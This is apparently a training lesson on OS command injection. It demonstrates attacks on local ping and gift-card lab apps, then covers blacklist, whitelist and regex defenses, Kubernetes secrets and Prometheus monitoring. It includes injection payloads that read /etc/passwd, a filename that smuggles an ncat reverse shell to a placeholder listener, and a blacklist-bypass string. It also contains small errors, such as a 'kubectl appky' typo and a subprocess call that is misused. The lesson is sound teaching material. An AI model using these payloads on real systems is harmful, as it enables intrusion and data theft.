# Security Journey — Work Sample Lesson

# Command Injection

OS Command Injection is a type of web application vulnerability that allows attackers to execute arbitrary operating system level commands on the server hosting the vulnerable application. If you're familiar with other common web application vulnerabilities, such as cross-site scripting (XSS) or SQL injection, then understanding OS command injection should be relatively straightforward. The main difference between these vulnerabilities is that in XSS, JavaScript code is injected and executed in the user's web browser, while in SQL injection, SQL commands are injected and executed in the database. With OS command injection, the injected commands are executed in the operating system's shell, allowing attackers to potentially gain complete control of the server and access sensitive information.

If you're new to web application vulnerabilities, it can be challenging to wrap your head around OS Command Injection. Imagine that your web application receives user input to perform an operation, but without any checks on the input, the application uses it to construct an OS command. Most users won't notice that their input is triggering an OS command, but a knowledgeable and persistent attacker could exploit this vulnerability. By injecting their own malicious commands into the input field, the attacker can execute those commands through the application. This gives the attacker control of the system and potentially access to sensitive information. The consequences could be severe, such as erasing the entire file system or stealing password hashes(cat /etc/shadow).

```bash
http://localhost:5000/ping
#go to this address on your browser
```

Consider this basic web application that pings a user-supplied address. If we experiment with the input field, we can observe that the application uses the input to construct an OS command to ping the target address. However, we don't know if the application applies any filtering or input sanitization to ensure the input is safe.

To test for vulnerabilities, let's input the address along with a shell command to see what happens.

```bash
input =  "8.8.8.8; cat /etc/passwd"
```

By including a shell command with the address in the input field, the application executes both commands, returning the ping results as well as the contents of the /etc/passwd file. If an attacker exploits this vulnerability, they can gain access to sensitive information such as user data and permissions.

This is a common example of how OS Command Injection works, but typically, the vulnerability isn't as obvious, and the attacker may not be able to view the output. However, the damage they can inflict on the system can be severe and chaotic.

OS Command injection attacks can be divided into two types,

1. Result based command injection (similar to the ping application from above)
2. Blind command injection

Personally, I find discovering and exploiting blind injection attacks more engaging. It often requires a bit of detective work. Unlike result-based command injection, in a blind injection attack, we don't receive any feedback from the application. In some cases, we may not even know if our input is triggering an OS command. It's like solving a puzzle, and the satisfaction of discovering a vulnerability that’s not openly visible is incredibly rewarding.

To uncover a blind injection vulnerability, you must experiment with different inputs and have a thorough understanding of how the application functions. One reliable form of feedback is time-based feedback. With this method, we can measure the time difference between benign inputs and malicious inputs to confirm whether the vulnerability exists and whether we have successfully exploited it. Depending on the target operating system, we can try various inputs and observe the difference in execution time to determine if the application is running an OS command.

```bash
http://localhost:5000/gift
#go to this address on your browser
```

Let us now look at a web application that can be used to recover old corrupted gift cards. The site instructs you to upload the gift card(this a binary file), once the gift card is uploaded the application sends out a message,

> *file uploaded successfully and if valid credits will be added to the account*
> 

Now, let's try exploiting this application using the knowledge we've gained about blind command injection. We can manipulate the file to inject malicious commands into the application. This can lead to various types of attacks, including data exfiltration, privilege escalation, or system compromise.

So, our clue to exploiting this application is that the file name is vulnerable. By carefully crafting the file name to include malicious commands, an attacker can exploit this vulnerability and gain unauthorized access to the system.

```python
filename = "test;ping -c 4 8.8.8.8"
#this filename exploits the vulnerability, instead of just pinging we can also create a reverse shell
reverseShellFilename = "test;ncat -c sh {listenerIp} {listernerPort}"
```

Now that we have an understanding of how this vulnerability works let us go back to our ping application but we’ll be using a different endpoint this time – “/pingSafe”. Try to exploit this vulnerability. Some protections have been added but they are not comprehensive.

```bash
http://localhost:5000/pingSafe
#go to this address on your browser
```

**************************************Payload to exploit(pingSafe):**************************************

> **{address}|\c\a\t${IFS}\/etc\/passwd**
> 

Let's examine the blacklist we used in our attempt to protect against command injection attacks:

```python
blacklist = [';', 'cat', '&', '\n', ' ']
```

While this blacklist does help to prevent certain strings from being used, attackers can still find ways to circumvent it by using alternative characters or commands. For example, space can be replaced by `{IFS}` and so on.

To provide more comprehensive protection against command injection attacks, a better approach would be to use a whitelist of permitted characters. By allowing only the characters that are necessary for a given input field, we can reduce the risk of an attacker injecting malicious commands. Another approach is to use regular expressions to verify that the input matches our expected format. We can also use parameterized functions to separate the command value from its arguments, which helps to prevent command injection by ensuring that only valid arguments are passed to the command. 

```python
#comprehensive blacklist
blacklist = [';', '&', '|', '>', '<', '$', '(', ')', '#', '*', '\'', '\"', '\\n', '\\r', '\\r\\n']

#regex function to sanitize the input
def saniRegex(inputString):
    #regex pattern defining the input
    pattern = re.compile(r'^[a-zA-Z0-9\-_.]*$')
    #condition to match input
    if pattern.match(inputString):
        return inputString
    else:
        cleanString = re.sub(r'[^\w\d\-_.]+', '_', inputString)
				#replaces invalid characters in input
        return cleanString

#using whitelist of allowed chars
def whiteListPing(ipAddr):
	#set of allowed characters
	allowed = set('0123456789.')
	#condition to check for invalid chars
	if set(ipAddr).issubset(allowed):
			cmd = ['ping','-c','4', ipAddr]
			res = subprocess.getoutput(cmd)
			return res
	else:
			return "Invalid Input"
```

Also when it comes to defending against command injection attacks, relying solely on escaping shell metacharacters is not a reliable approach. This technique involves adding backslashes before certain characters that may be interpreted as special characters by the shell, with the goal of ensuring they are treated as literal characters. However, this approach is error-prone and can be bypassed. Even slight omissions or inconsistencies in escaping characters can open up security vulnerabilities.

In summary, while blacklists can provide some level of protection against command injection attacks, using a whitelist of permitted characters, regular expressions, and parameterized functions can offer more comprehensive and effective protection against these types of vulnerabilities.

## Deploying the Application and also securing the deployment

> *#Not going in depth with Kubernetes secrets and Prometheus. Just enough to convey my approach.*
> 

In this next stage, we will focus on enhancing the security of our application that has been deployed in a Kubernetes cluster. For the purposes of this discussion, let us assume that our gift card site is up and running smoothly. We also have three pods running, one for our Flask web application, one for the database, and another for the proxy service. It is important to note that we did not encounter any problems during the deployment of these applications and we can currently access the site without any issues.

In the deployment phase, it is crucial to ensure that there are no secret values visible in the source code and yaml files. These secrets must be protected in such a way that the code and Docker images can be shared, distributed or open-sourced without risking the exposure of our sensitive information. By secrets, we are referring to the MySQL root password that may be present in the *-deployment.yaml files and the keys utilized for signing cookies that may be present in the source code. While secure coding practices would help address these configuration issues, it is still essential to discuss these concerns when considering the safety of our application deployment.

Documentation on Securing Kubernetes Secrets - [https://kubernetes.io/docs/tasks/inject-data-application/distribute-credentials-secure](https://kubernetes.io/docs/tasks/inject-data-application/distribute-credentials-secure/)

We encode the secrets into a base64 representation,

```bash
echo -n 'securityJourneyDBPass' | base64
#c2VjdXJpdHlKb3VybmV5REJQYXNz
```

After encoding the secret, we’ll create yaml file “sj-secrets.yaml” and store it.

```bash
apiVersion: v1
kind: Secret
metadata:
        name: sj-secrets
type: Opaque
data: 
        MYSQL_ROOT_PASSWORD: c2VjdXJpdHlKb3VybmV5REJQYXNz

#after saving the above, we run
kubectl appky -f sj-secrets.yaml
```

Similarly for secret found in the source code(key used for signing), we secure it by saving it in a text file or just copying and doing the following

```bash
kubectl create secret generic secret-key-source --from-file=./secret-key-src.txt

#or we can also use the --from-literal option and paste the key in the command
```

Now if we run `kubectl get secret` , we should see our added secrets. After this we should add the created secrets to the web-app deployment and db deployment yaml files. Once this is done we have recreate our pods and our secrets have been secured. 

Now let us add some monitoring for the application such that we can proactively work on securing the application, instead of just reacting to incidents. We’ll be using Prometheus for monitoring. 

Steps on how to add Prometheus to Kubernetes - [https://prometheus.io/docs/introduction/overview/](https://prometheus.io/docs/introduction/overview/)

When setting up monitoring with Prometheus we must make sure that we don’t monitor and print out any sensitive data. For example like the passwords entered. 

Once we have installed and added Prometheus to Kubernetes, we can refer to the following snippets to setup monitoring for different actions. We do the following in our applications source code. 

```python
#!/usr/bin/python3

#other imports
import prometheus_client
from prometheus_client.core import CollectorRegistry
from prometheus_client import Summary, Counter, Histogram, Gauge

#define counters
graphs = {}

#define counter for card uploads
graphs['upload_counter'] = Counter('python_request_uploads', 'The total number'\
  + ' of card uploads.')

#define counter for db errors
graphs['database_error_return_404'] = Counter('database_error_return_404', 'The total number'\
  + ' of times we return a 404 message')

#other app related code snippets

# to increment the upload counter, we include the following in the appropriate spots where the card upload actions are handled
graphs['upload_counter'].inc()

#to increment the db error counter, we include the following in the appropriate spots where error is captured
graphs['database_error_return_404'].inc()
```

The securing of Kubernetes secrets and using Prometheus to monitor the application does not directly deal with learning about a security vulnerability but they are essential in ensuring the security and reliability of the our web application. These steps help us prevent security breaches and improve application uptime.